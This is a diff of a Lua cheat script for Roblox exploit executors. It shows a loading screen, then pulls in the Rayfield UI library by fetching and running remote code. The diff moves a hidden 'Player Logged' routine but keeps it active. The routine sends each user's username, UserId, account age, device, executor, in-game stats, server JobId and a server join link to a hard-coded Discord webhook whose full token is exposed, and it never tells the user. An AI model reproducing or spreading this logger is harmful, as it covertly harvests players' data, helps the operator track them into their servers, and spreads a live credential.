@@ -17,22 +17,15 @@ local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 local Stats = LocalPlayer:WaitForChild("Stats")
 local CoreGui = game:GetService("CoreGui")
 
-local player = Players.LocalPlayer
-
--- 🔗 WEBHOOK URL
+-- ========== WEBHOOK ==========
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1441467893580693524/ThWxlD_ZSJMuhxzM5AtG_fwA7H6TcBNrcCKPNZao438JWYpLPNj7IEmMtTQwxuPW7opu"
-
--- EXECUTOR COMPAT
 local req = (syn and syn.request) or (http_request) or (request) or (fluxus and fluxus.request)
 
 if not req then
-    warn("❌ HTTP request not supported by executor")
-    return
+    warn("HTTP request not supported by executor")
 end
 
--- =========================
--- EXECUTOR NAME
--- =========================
+-- ========== EXECUTOR & DEVICE & PING ==========
 local function GetExecutor()
     if identifyexecutor then
         local ok, name = pcall(identifyexecutor)
@@ -44,9 +37,6 @@ local function GetExecutor()
     return "Unknown Executor"
 end
 
--- =========================
--- DEVICE TYPE (PC/MOBILE/CONSOLE)
--- =========================
 local function GetDevice()
     if UIS.TouchEnabled and not UIS.KeyboardEnabled then
         return "Mobile"
@@ -57,9 +47,6 @@ local function GetDevice()
     end
 end
 
--- =========================
--- PING
--- =========================
 local function GetPing()
     local ping = "N/A"
     pcall(function()
@@ -68,83 +55,7 @@ local function GetPing()
     return ping
 end
 
--- =========================
--- GET STATS (Coins, XP, SkillPoints)
--- =========================
-local function GetStats()
-    local coins, level, xp, points = "N/A", "N/A", "N/A", "N/A"
-    pcall(function()
-        local gui = player.PlayerGui:WaitForChild("GameGui", 10):WaitForChild("LobbyHUD", 10):WaitForChild("Topbar", 10):WaitForChild("Leaderstats", 10)
-        coins = gui.Coins.Container.Amount.Text
-        level = gui.Experience.Container.Amount.Text
-        xp = gui.Experience.Container.Other.Text
-        points = gui.SkillPoints.Container.Amount.Text
-    end)
-    return coins, level, xp, points
-end
-
--- =========================
--- SEND WEBHOOK
--- =========================
-local function SendWebhook()
-    local coins, level, xp, points = GetStats()
-
-    local username = player.Name
-    local displayName = player.DisplayName
-    local userId = player.UserId
-    local accountAge = player.AccountAge .. " days"
-    local jobId = game.JobId
-    local placeId = game.PlaceId
-    local joinLink = "https://www.roblox.com/games/" .. placeId .. "?jobId=" .. jobId
-
-    local gameName = "Unknown"
-    pcall(function() gameName = MarketplaceService:GetProductInfo(placeId).Name end)
-
-    local executor = GetExecutor()
-    local device = GetDevice()
-    local ping = GetPing()
-
-    local payload = {
-        username = "TsurenStudios Logger",
-        content = "✅ Rayfield Loaded",
-        embeds = {{
-            title = "🎮 Player Logged",
-            color = 5793266,
-            fields = {
-                { name = "👤 Username", value = username, inline = true },
-                { name = "✨ Display Name", value = displayName, inline = true },
-                { name = "🆔 UserId", value = tostring(userId), inline = true },
-                { name = "📅 Account Age", value = accountAge, inline = true },
-                { name = "💻 Device", value = device, inline = true },
-                { name = "⚙ Executor", value = executor, inline = true },
-                { name = "📡 Ping", value = ping, inline = true },
-                { name = "💰 Coins", value = coins, inline = true },
-                { name = "⭐ Level", value = level, inline = true },
-                { name = "⚡ XP", value = xp, inline = true },
-                { name = "🎯 SkillPoints", value = points, inline = true },
-                { name = "🎮 Game", value = gameName, inline = false },
-                { name = "🧩 JobId", value = "```" .. jobId .. "```", inline = false },
-                { name = "🔗 Join Server", value = joinLink, inline = false }
-            },
-            footer = {
-                text = "TsurenStudios | FINAL FIX"
-            },
-            timestamp = DateTime.now():ToIsoDate()
-        }}
-    }
-
-    pcall(function()
-        req({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(payload)
-        })
-    end)
-end
--- =========================
--- LOAD SCREEN SCRIPT
--- =========================
+-- ========== LOAD SCREEN ==========
 local LoadingActive = false
 
 local function StartLoadingScreen()
@@ -155,7 +66,7 @@ local function StartLoadingScreen()
     gui.Name = "LoadingScreen"
     gui.IgnoreGuiInset = true
     gui.ResetOnSpawn = false
-    gui.Parent = player.PlayerGui
+    gui.Parent = PlayerGui
 
     local bg = Instance.new("Frame")
     bg.Size = UDim2.fromScale(1,1)
@@ -210,13 +121,11 @@ local function StartLoadingScreen()
     local logs = {}
     local function addLog(msg)
         table.insert(logs, msg)
-        if #logs > 18 then
-            table.remove(logs,1)
-        end
+        if #logs > 18 then table.remove(logs,1) end
         consoleText.Text = table.concat(logs, "\n")
     end
 
-    LogService.MessageOut:Connect(function(message, messageType)
+    LogService.MessageOut:Connect(function(message)
         addLog("> "..message)
     end)
 
@@ -247,7 +156,6 @@ local function StartLoadingScreen()
         consoleText.Text = ""
         consoleFrame.BorderSizePixel = 0
         consoleFrame.BackgroundTransparency = 1
-
         local heart = Instance.new("TextLabel")
         heart.Size = UDim2.fromScale(1,1)
         heart.Position = UDim2.new(0,0,0,0)
@@ -276,17 +184,11 @@ local function StartLoadingScreen()
 
         local heartText = ""
         for _,line in ipairs(heartPattern) do
-            local row = ""
             for c in line:gmatch(".") do
-                if c == "1" then
-                    row = row.."1"
-                else
-                    row = row.." "
-                end
+                heartText = heartText .. (c=="1" and "1" or " ") 
             end
-            heartText = heartText..row.."\n"
+            heartText = heartText.."\n"
         end
-
         heart.Text = heartText
         heart.Parent = consoleFrame
 
@@ -301,16 +203,84 @@ local function StartLoadingScreen()
         end)
     end)
 
-    while LoadingActive do
-        task.wait()
-    end
+    while LoadingActive do task.wait() end
 end
 
+-- Start Loadscreen
 StartLoadingScreen()
-
 repeat task.wait() until not LoadingActive
 
--- Start Rayfield
+-- ========== SAFE STATS ==========
+local function GetSafeStats()
+    local coins, level, xp, points = "N/A","N/A","N/A","N/A"
+    local success, gui = pcall(function()
+        return PlayerGui:WaitForChild("GameGui",15):WaitForChild("LobbyHUD",15):WaitForChild("Topbar",15):WaitForChild("Leaderstats",15)
+    end)
+    if success and gui then
+        pcall(function() coins = gui.Coins.Container.Amount.Text end)
+        pcall(function() level = gui.Experience.Container.Amount.Text end)
+        pcall(function() xp = gui.Experience.Container.Other.Text end)
+        pcall(function() points = gui.SkillPoints.Container.Amount.Text end)
+    end
+    return coins, level, xp, points
+end
+
+-- ========== SEND WEBHOOK ==========
+local function SendWebhook()
+    if not req then return end
+    local coins, level, xp, points = GetSafeStats()
+
+    local username = LocalPlayer.Name
+    local displayName = LocalPlayer.DisplayName
+    local userId = LocalPlayer.UserId
+    local accountAge = LocalPlayer.AccountAge .. " days"
+    local jobId = game.JobId
+    local placeId = game.PlaceId
+    local joinLink = "https://www.roblox.com/games/"..placeId.."?jobId="..jobId
+    local gameName = "Unknown"
+    pcall(function() gameName = MarketplaceService:GetProductInfo(placeId).Name end)
+
+    local payload = {
+        username = "TsurenStudios Logger",
+        content = "✅ Rayfield Loaded",
+        embeds = {{
+            title = "🎮 Player Logged",
+            color = 5793266,
+            fields = {
+                {name="👤 Username", value=username, inline=true},
+                {name="✨ Display Name", value=displayName, inline=true},
+                {name="🆔 UserId", value=tostring(userId), inline=true},
+                {name="📅 Account Age", value=accountAge, inline=true},
+                {name="💻 Device", value=GetDevice(), inline=true},
+                {name="⚙ Executor", value=GetExecutor(), inline=true},
+                {name="📡 Ping", value=GetPing(), inline=true},
+                {name="💰 Coins", value=coins, inline=true},
+                {name="⭐ Level", value=level, inline=true},
+                {name="⚡ XP", value=xp, inline=true},
+                {name="🎯 SkillPoints", value=points, inline=true},
+                {name="🎮 Game", value=gameName, inline=false},
+                {name="🧩 JobId", value="```"..jobId.."```", inline=false},
+                {name="🔗 Join Server", value=joinLink, inline=false},
+            },
+            footer = {text="TsurenStudios | FINAL FIX"},
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+
+    pcall(function()
+        req({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"]="application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+end
+
+-- Send webhook safely after loadscreen
+task.delay(1, SendWebhook)
+
+-- ========== LOAD RAYFIELD ==========
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 local Window = Rayfield:CreateWindow({
     Name = "TsurenStudios | SLS 🌸",
@@ -318,8 +288,6 @@ local Window = Rayfield:CreateWindow({
     LoadingSubtitle = "Made by Tsubasa ♥️",
     Theme = "Bloom"
 })
-
-task.delay(1, SendWebhook)
 
 
 local function GetBall()
